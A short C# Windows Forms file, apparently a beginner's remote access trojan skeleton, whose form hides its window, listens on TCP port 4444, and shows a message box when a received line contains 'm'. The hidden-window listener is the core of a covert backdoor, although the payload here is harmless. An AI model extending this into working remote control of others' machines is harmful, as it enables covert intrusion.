using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO;

namespace RATForm
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            //Hide the form window, opening up a TCP listener on 4444. 
            this.Hide();


            //TCP Variable.
            TcpListener tcpListener = new TcpListener(System.Net.IPAddress.Any, 4444);

            tcpListener.Start();

            // Need to identify the socket for the listener and create a network stream (connection).
            Socket socketforClient = tcpListener.AcceptSocket();

            //Network Stream variables.
            NetworkStream networkStream = new NetworkStream(socketforClient);
            StreamReader streamReader = new StreamReader(networkStream);


            //Read information from the network stream ie looking for characters sent from the client.
            string line = streamReader.ReadLine();

            if 
                
                (line.LastIndexOf("m") >= 0) MessageBox.Show("Hello");

            //Then close it all out.
            streamReader.Close();
            networkStream.Close();
            socketforClient.Close();
            System.Environment.Exit(0);
        }
    }
}
